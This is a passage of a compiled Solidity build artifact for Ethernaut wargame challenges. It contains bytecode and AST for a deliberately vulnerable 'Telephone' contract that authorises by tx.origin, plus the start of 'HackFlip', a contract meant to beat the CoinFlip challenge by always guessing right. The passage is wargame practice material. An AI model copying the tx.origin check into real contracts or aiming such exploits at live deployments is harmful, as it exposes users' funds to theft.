                          {
                            "name": "memPtr",
                            "nodeType": "YulTypedName",
                            "src": "626:6:4",
                            "type": ""
                          }
                        ],
                        "src": "593:75:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "763:28:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "780:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "783:1:4",
                                    "type": "",
                                    "value": "0"
                                  }
                                ],
                                "functionName": {
                                  "name": "revert",
                                  "nodeType": "YulIdentifier",
                                  "src": "773:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "773:12:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "773:12:4"
                            }
                          ]
                        },
                        "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
                        "nodeType": "YulFunctionDefinition",
                        "src": "674:117:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "886:28:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "903:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "906:1:4",
                                    "type": "",
                                    "value": "0"
                                  }
                                ],
                                "functionName": {
                                  "name": "revert",
                                  "nodeType": "YulIdentifier",
                                  "src": "896:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "896:12:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "896:12:4"
                            }
                          ]
                        },
                        "name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
                        "nodeType": "YulFunctionDefinition",
                        "src": "797:117:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "963:79:4",
                          "statements": [
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "1020:16:4",
                                "statements": [
                                  {
                                    "expression": {
                                      "arguments": [
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "1029:1:4",
                                          "type": "",
                                          "value": "0"
                                        },
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "1032:1:4",
                                          "type": "",
                                          "value": "0"
                                        }
                                      ],
                                      "functionName": {
                                        "name": "revert",
                                        "nodeType": "YulIdentifier",
                                        "src": "1022:6:4"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "1022:12:4"
                                    },
                                    "nodeType": "YulExpressionStatement",
                                    "src": "1022:12:4"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "arguments": [
                                      {
                                        "name": "value",
                                        "nodeType": "YulIdentifier",
                                        "src": "986:5:4"
                                      },
                                      {
                                        "arguments": [
                                          {
                                            "name": "value",
                                            "nodeType": "YulIdentifier",
                                            "src": "1011:5:4"
                                          }
                                        ],
                                        "functionName": {
                                          "name": "cleanup_t_address",
                                          "nodeType": "YulIdentifier",
                                          "src": "993:17:4"
                                        },
                                        "nodeType": "YulFunctionCall",
                                        "src": "993:24:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "eq",
                                      "nodeType": "YulIdentifier",
                                      "src": "983:2:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "983:35:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "iszero",
                                  "nodeType": "YulIdentifier",
                                  "src": "976:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "976:43:4"
                              },
                              "nodeType": "YulIf",
                              "src": "973:63:4"
                            }
                          ]
                        },
                        "name": "validator_revert_t_address",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "956:5:4",
                            "type": ""
                          }
                        ],
                        "src": "920:122:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "1100:87:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "1110:29:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "offset",
                                    "nodeType": "YulIdentifier",
                                    "src": "1132:6:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "calldataload",
                                  "nodeType": "YulIdentifier",
                                  "src": "1119:12:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1119:20:4"
                              },
                              "variableNames": [
                                {
                                  "name": "value",
                                  "nodeType": "YulIdentifier",
                                  "src": "1110:5:4"
                                }
                              ]
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "name": "value",
                                    "nodeType": "YulIdentifier",
                                    "src": "1175:5:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "validator_revert_t_address",
                                  "nodeType": "YulIdentifier",
                                  "src": "1148:26:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1148:33:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "1148:33:4"
                            }
                          ]
                        },
                        "name": "abi_decode_t_address",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "offset",
                            "nodeType": "YulTypedName",
                            "src": "1078:6:4",
                            "type": ""
                          },
                          {
                            "name": "end",
                            "nodeType": "YulTypedName",
                            "src": "1086:3:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "1094:5:4",
                            "type": ""
                          }
                        ],
                        "src": "1048:139:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "1259:263:4",
                          "statements": [
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "1305:83:4",
                                "statements": [
                                  {
                                    "expression": {
                                      "arguments": [],
                                      "functionName": {
                                        "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
                                        "nodeType": "YulIdentifier",
                                        "src": "1307:77:4"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "1307:79:4"
                                    },
                                    "nodeType": "YulExpressionStatement",
                                    "src": "1307:79:4"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "arguments": [
                                      {
                                        "name": "dataEnd",
                                        "nodeType": "YulIdentifier",
                                        "src": "1280:7:4"
                                      },
                                      {
                                        "name": "headStart",
                                        "nodeType": "YulIdentifier",
                                        "src": "1289:9:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "sub",
                                      "nodeType": "YulIdentifier",
                                      "src": "1276:3:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "1276:23:4"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1301:2:4",
                                    "type": "",
                                    "value": "32"
                                  }
                                ],
                                "functionName": {
                                  "name": "slt",
                                  "nodeType": "YulIdentifier",
                                  "src": "1272:3:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1272:32:4"
                              },
                              "nodeType": "YulIf",
                              "src": "1269:119:4"
                            },
                            {
                              "nodeType": "YulBlock",
                              "src": "1398:117:4",
                              "statements": [
                                {
                                  "nodeType": "YulVariableDeclaration",
                                  "src": "1413:15:4",
                                  "value": {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1427:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  "variables": [
                                    {
                                      "name": "offset",
                                      "nodeType": "YulTypedName",
                                      "src": "1417:6:4",
                                      "type": ""
                                    }
                                  ]
                                },
                                {
                                  "nodeType": "YulAssignment",
                                  "src": "1442:63:4",
                                  "value": {
                                    "arguments": [
                                      {
                                        "arguments": [
                                          {
                                            "name": "headStart",
                                            "nodeType": "YulIdentifier",
                                            "src": "1477:9:4"
                                          },
                                          {
                                            "name": "offset",
                                            "nodeType": "YulIdentifier",
                                            "src": "1488:6:4"
                                          }
                                        ],
                                        "functionName": {
                                          "name": "add",
                                          "nodeType": "YulIdentifier",
                                          "src": "1473:3:4"
                                        },
                                        "nodeType": "YulFunctionCall",
                                        "src": "1473:22:4"
                                      },
                                      {
                                        "name": "dataEnd",
                                        "nodeType": "YulIdentifier",
                                        "src": "1497:7:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "abi_decode_t_address",
                                      "nodeType": "YulIdentifier",
                                      "src": "1452:20:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "1452:53:4"
                                  },
                                  "variableNames": [
                                    {
                                      "name": "value0",
                                      "nodeType": "YulIdentifier",
                                      "src": "1442:6:4"
                                    }
                                  ]
                                }
                              ]
                            }
                          ]
                        },
                        "name": "abi_decode_tuple_t_address",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "headStart",
                            "nodeType": "YulTypedName",
                            "src": "1229:9:4",
                            "type": ""
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulTypedName",
                            "src": "1240:7:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "value0",
                            "nodeType": "YulTypedName",
                            "src": "1252:6:4",
                            "type": ""
                          }
                        ],
                        "src": "1193:329:4"
                      }
                    ]
                  },
                  "contents": "{\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
                  "id": 4,
                  "language": "Yul",
                  "name": "#utility.yul"
                }
              ],
              "immutableReferences": {},
              "linkReferences": {},
              "object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80638da5cb5b1461003b578063a6f9dae114610059575b600080fd5b610043610075565b604051610050919061028d565b60405180910390f35b610073600480360381019061006e91906102d9565b610099565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6100c57f38129285ef6b951be267187da0a3976f3236fef5d6c410783ffc2bece4648a8760001b610249565b6100f17ffa3db312605afcf5202006c41f66c777015f723b2f085cf690d0de1f2806d7dd60001b610249565b61011d7fb1e5e0c2ba09d6443ec30f0e6e4e0ca0dd8ecabe7e15aa3f12da193aafd3645660001b610249565b3373ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff16146102195761017c7f22f7d2abe44d6053a3243d9d9d2f4426aad098dbe1cb271911ed6507fbfaad6060001b610249565b6101a87f19de63b7782c281e196d7d5d8f246109d381ed54bb991c48e259fc1a7638146e60001b610249565b6101d47f76bbb05eaa8aebb25d0ad81375425536dfd3cba526694262c820abbcacf8562460001b610249565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610246565b6102457f9af4fefc324f1fdb166748644e640a9e04f1064999de7cea303fb012561dd24660001b610249565b5b50565b50565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102778261024c565b9050919050565b6102878161026c565b82525050565b60006020820190506102a2600083018461027e565b92915050565b600080fd5b6102b68161026c565b81146102c157600080fd5b50565b6000813590506102d3816102ad565b92915050565b6000602082840312156102ef576102ee6102a8565b5b60006102fd848285016102c4565b9150509291505056fea26469706673582212204c6cc8711c043ee4f126170e6f1b18af579bd01887ed69aa561e9ee25e7b415164736f6c634300080a0033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xA6F9DAE1 EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x75 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x28D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x2D9 JUMP JUMPDEST PUSH2 0x99 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH2 0xC5 PUSH32 0x38129285EF6B951BE267187DA0A3976F3236FEF5D6C410783FFC2BECE4648A87 PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST PUSH2 0xF1 PUSH32 0xFA3DB312605AFCF5202006C41F66C777015F723B2F085CF690D0DE1F2806D7DD PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST PUSH2 0x11D PUSH32 0xB1E5E0C2BA09D6443EC30F0E6E4E0CA0DD8ECABE7E15AA3F12DA193AAFD36456 PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x219 JUMPI PUSH2 0x17C PUSH32 0x22F7D2ABE44D6053A3243D9D9D2F4426AAD098DBE1CB271911ED6507FBFAAD60 PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST PUSH2 0x1A8 PUSH32 0x19DE63B7782C281E196D7D5D8F246109D381ED54BB991C48E259FC1A7638146E PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST PUSH2 0x1D4 PUSH32 0x76BBB05EAA8AEBB25D0AD81375425536DFD3CBA526694262C820ABBCACF85624 PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x246 JUMP JUMPDEST PUSH2 0x245 PUSH32 0x9AF4FEFC324F1FDB166748644E640A9E04F1064999DE7CEA303FB012561DD246 PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST JUMPDEST POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x277 DUP3 PUSH2 0x24C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x287 DUP2 PUSH2 0x26C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2A2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x27E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2B6 DUP2 PUSH2 0x26C JUMP JUMPDEST DUP2 EQ PUSH2 0x2C1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2D3 DUP2 PUSH2 0x2AD JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2EF JUMPI PUSH2 0x2EE PUSH2 0x2A8 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2FD DUP5 DUP3 DUP6 ADD PUSH2 0x2C4 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x4C PUSH13 0xC8711C043EE4F126170E6F1B18 0xAF JUMPI SWAP12 0xD0 XOR DUP8 0xED PUSH10 0xAA561E9EE25E7B415164 PUSH20 0x6F6C634300080A00330000000000000000000000 ",
              "sourceMap": "114:1287:3:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;203:20;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;582:816;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;203:20;;;;;;;;;;;;:::o;582:816::-;627:80;640:66;627:80;;:12;:80::i;:::-;727;740:66;727:80;;:12;:80::i;:::-;829;842:66;829:80;;:12;:80::i;:::-;945:10;932:23;;:9;:23;;;928:463;;958:80;971:66;958:80;;:12;:80::i;:::-;1056;1069:66;1056:80;;:12;:80::i;:::-;1162;1175:66;1162:80;;:12;:80::i;:::-;1269:6;1261:5;;:14;;;;;;;;;;;;;;;;;;928:463;;;1294:80;1307:66;1294:80;;:12;:80::i;:::-;928:463;582:816;:::o;135:61::-;;:::o;7:126:4:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:96::-;176:7;205:24;223:5;205:24;:::i;:::-;194:35;;139:96;;;:::o;241:118::-;328:24;346:5;328:24;:::i;:::-;323:3;316:37;241:118;;:::o;365:222::-;458:4;496:2;485:9;481:18;473:26;;509:71;577:1;566:9;562:17;553:6;509:71;:::i;:::-;365:222;;;;:::o;674:117::-;783:1;780;773:12;920:122;993:24;1011:5;993:24;:::i;:::-;986:5;983:35;973:63;;1032:1;1029;1022:12;973:63;920:122;:::o;1048:139::-;1094:5;1132:6;1119:20;1110:29;;1148:33;1175:5;1148:33;:::i;:::-;1048:139;;;;:::o;1193:329::-;1252:6;1301:2;1289:9;1280:7;1276:23;1272:32;1269:119;;;1307:79;;:::i;:::-;1269:119;1427:1;1452:53;1497:7;1488:6;1477:9;1473:22;1452:53;:::i;:::-;1442:63;;1398:117;1193:329;;;;:::o"
            },
            "methodIdentifiers": {
              "changeOwner(address)": "a6f9dae1",
              "owner()": "8da5cb5b"
            }
          },
          "metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"changeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/4_Telephone/Telephone.sol\":\"Telephone\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":1000},\"remappings\":[]},\"sources\":{\"contracts/4_Telephone/Telephone.sol\":{\"keccak256\":\"0xf746b8f1f615dc9b5bc7b491b80f8901d9d00a01a463705b8b0a3fde0d2474d0\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://dcd31627cda8111364aacdf138af0a60399424917f6069adce7f040c3995a9be\",\"dweb:/ipfs/QmQ7Cnf7EYEWzgq2FoHGrszw5rX4wxuaR9ad41E7zd3U6m\"]}},\"version\":1}"
        }
      }
    },
    "sources": {
      "contracts/3_CoinFlip/CoinFlip.sol": {
        "ast": {
          "absolutePath": "contracts/3_CoinFlip/CoinFlip.sol",
          "exportedSymbols": {
            "CoinFlip": [
              16
            ],
            "c_0xd4d66cc9": [
              7
            ]
          },
          "id": 17,
          "license": "MIT",
          "nodeType": "SourceUnit",
          "nodes": [
            {
              "id": 1,
              "literals": [
                "solidity",
                "0.8",
                ".10"
              ],
              "nodeType": "PragmaDirective",
              "src": "33:23:0"
            },
            {
              "body": {
                "id": 6,
                "nodeType": "Block",
                "src": "107:2:0",
                "statements": []
              },
              "id": 7,
              "implemented": true,
              "kind": "freeFunction",
              "modifiers": [],
              "name": "c_0xd4d66cc9",
              "nameLocation": "66:12:0",
              "nodeType": "FunctionDefinition",
              "parameters": {
                "id": 4,
                "nodeType": "ParameterList",
                "parameters": [
                  {
                    "constant": false,
                    "id": 3,
                    "mutability": "mutable",
                    "name": "c__0xd4d66cc9",
                    "nameLocation": "87:13:0",
                    "nodeType": "VariableDeclaration",
                    "scope": 7,
                    "src": "79:21:0",
                    "stateVariable": false,
                    "storageLocation": "default",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes32",
                      "typeString": "bytes32"
                    },
                    "typeName": {
                      "id": 2,
                      "name": "bytes32",
                      "nodeType": "ElementaryTypeName",
                      "src": "79:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bytes32",
                        "typeString": "bytes32"
                      }
                    },
                    "visibility": "internal"
                  }
                ],
                "src": "78:23:0"
              },
              "returnParameters": {
                "id": 5,
                "nodeType": "ParameterList",
                "parameters": [],
                "src": "107:0:0"
              },
              "scope": 17,
              "src": "57:52:0",
              "stateMutability": "pure",
              "virtual": false,
              "visibility": "internal"
            },
            {
              "abstract": false,
              "baseContracts": [],
              "canonicalName": "CoinFlip",
              "contractDependencies": [],
              "contractKind": "interface",
              "documentation": {
                "id": 8,
                "nodeType": "StructuredDocumentation",
                "src": "114:31:0",
                "text": "@title Ethernaut Contract"
              },
              "fullyImplemented": false,
              "id": 16,
              "linearizedBaseContracts": [
                16
              ],
              "name": "CoinFlip",
              "nameLocation": "155:8:0",
              "nodeType": "ContractDefinition",
              "nodes": [
                {
                  "functionSelector": "1d263f67",
                  "id": 15,
                  "implemented": false,
                  "kind": "function",
                  "modifiers": [],
                  "name": "flip",
                  "nameLocation": "180:4:0",
                  "nodeType": "FunctionDefinition",
                  "parameters": {
                    "id": 11,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 10,
                        "mutability": "mutable",
                        "name": "_guess",
                        "nameLocation": "190:6:0",
                        "nodeType": "VariableDeclaration",
                        "scope": 15,
                        "src": "185:11:0",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        "typeName": {
                          "id": 9,
                          "name": "bool",
                          "nodeType": "ElementaryTypeName",
                          "src": "185:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "visibility": "internal"
                      }
                    ],
                    "src": "184:13:0"
                  },
                  "returnParameters": {
                    "id": 14,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 13,
                        "mutability": "mutable",
                        "name": "",
                        "nameLocation": "-1:-1:-1",
                        "nodeType": "VariableDeclaration",
                        "scope": 15,
                        "src": "216:4:0",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        "typeName": {
                          "id": 12,
                          "name": "bool",
                          "nodeType": "ElementaryTypeName",
                          "src": "216:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "visibility": "internal"
                      }
                    ],
                    "src": "215:6:0"
                  },
                  "scope": 16,
                  "src": "171:51:0",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "external"
                }
              ],
              "scope": 17,
              "src": "145:80:0",
              "usedErrors": []
            }
          ],
          "src": "33:194:0"
        },
        "id": 0
      },
      "contracts/3_CoinFlip/HackFlip.sol": {
        "ast": {
          "absolutePath": "contracts/3_CoinFlip/HackFlip.sol",
          "exportedSymbols": {
            "CoinFlip": [
              16
            ],
            "HackFlip": [
              175
            ],
            "c_0x2d53c14b": [
              24
            ],
            "c_0xd4d66cc9": [
              7
            ]
          },
          "id": 176,
          "license": "MIT",
          "nodeType": "SourceUnit",
          "nodes": [
            {
              "id": 18,
              "literals": [
                "solidity",
                "0.8",
                ".10"
              ],
              "nodeType": "PragmaDirective",
              "src": "33:23:1"
            },
            {
              "body": {
                "id": 23,
                "nodeType": "Block",
                "src": "107:2:1",
                "statements": []
              },
              "id": 24,
              "implemented": true,
              "kind": "freeFunction",
              "modifiers": [],
              "name": "c_0x2d53c14b",
              "nameLocation": "66:12:1",
              "nodeType": "FunctionDefinition",
              "parameters": {
                "id": 21,
                "nodeType": "ParameterList",
                "parameters": [
                  {
                    "constant": false,
                    "id": 20,
                    "mutability": "mutable",
                    "name": "c__0x2d53c14b",
                    "nameLocation": "87:13:1",
                    "nodeType": "VariableDeclaration",
                    "scope": 24,
                    "src": "79:21:1",
                    "stateVariable": false,
                    "storageLocation": "default",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes32",
                      "typeString": "bytes32"
                    },
                    "typeName": {
                      "id": 19,
                      "name": "bytes32",
                      "nodeType": "ElementaryTypeName",
                      "src": "79:7:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bytes32",
                        "typeString": "bytes32"
                      }
                    },
                    "visibility": "internal"
                  }
                ],
                "src": "78:23:1"
              },
              "returnParameters": {
                "id": 22,
                "nodeType": "ParameterList",
                "parameters": [],
                "src": "107:0:1"
              },
              "scope": 176,
              "src": "57:52:1",
              "stateMutability": "pure",
              "virtual": false,
              "visibility": "internal"
            },
            {
              "absolutePath": "contracts/3_CoinFlip/CoinFlip.sol",
              "file": "./CoinFlip.sol",
              "id": 25,
              "nameLocation": "-1:-1:-1",
              "nodeType": "ImportDirective",
              "scope": 176,
              "sourceUnit": 17,
              "src": "114:24:1",
              "symbolAliases": [],
              "unitAlias": ""
            },
            {
              "abstract": false,
              "baseContracts": [],
              "canonicalName": "HackFlip",
              "contractDependencies": [],
              "contractKind": "contract",
              "documentation": {
                "id": 26,
                "nodeType": "StructuredDocumentation",
                "src": "142:187:1",
                "text": "@title Contract for hacking CoinFlip.sol in Ethernaut\n @author Pedro Reyes\n @notice This contract calls CoinFlip.sol and with the right value (true/false) for always winning"
              },
              "fullyImplemented": true,
              "id": 175,
              "linearizedBaseContracts": [
                175
              ],
              "name": "HackFlip",
              "nameLocation": "338:8:1",
              "nodeType": "ContractDefinition",
              "nodes": [
                {
                  "body": {
                    "id": 31,
                    "nodeType": "Block",
                    "src": "408:2:1",
                    "statements": []
                  },
                  "id": 32,
                  "implemented": true,
                  "kind": "function",
                  "modifiers": [],
                  "name": "c_0xcd8256e5",
                  "nameLocation": "358:12:1",
                  "nodeType": "FunctionDefinition",
                  "parameters": {
                    "id": 29,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 28,
                        "mutability": "mutable",
                        "name": "c__0xcd8256e5",
                        "nameLocation": "379:13:1",
                        "nodeType": "VariableDeclaration",
                        "scope": 32,
                        "src": "371:21:1",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes32",
                          "typeString": "bytes32"
                        },
                        "typeName": {
                          "id": 27,
                          "name": "bytes32",
                          "nodeType": "ElementaryTypeName",
                          "src": "371:7:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bytes32",
                            "typeString": "bytes32"
                          }
                        },
                        "visibility": "internal"
                      }
                    ],
                    "src": "370:23:1"
                  },
                  "returnParameters": {
                    "id": 30,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "408:0:1"
                  },
                  "scope": 175,
                  "src": "349:61:1",
                  "stateMutability": "pure",
                  "virtual": false,
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 34,
                  "mutability": "mutable",
                  "name": "lastHash",
                  "nameLocation": "425:8:1",
                  "nodeType": "VariableDeclaration",
                  "scope": 175,
                  "src": "417:16:1",
                  "stateVariable": true,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 33,
                    "name": "uint256",
